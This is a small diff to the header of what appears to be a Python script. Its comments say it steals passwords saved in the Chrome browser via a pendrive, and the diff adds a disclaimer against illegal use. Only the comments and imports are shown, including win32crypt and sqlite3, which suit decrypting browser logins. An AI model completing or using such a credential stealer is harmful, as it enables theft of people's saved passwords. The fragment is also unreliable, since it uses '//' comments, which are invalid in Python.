@@ -2,6 +2,7 @@
 //Steal password stored in chrome browser
 //Use pendrive properly 
 //Only for educational purpose
+//Do not use for illegal purpose
 
 import sqlite3, win32crypt, os, sys
 
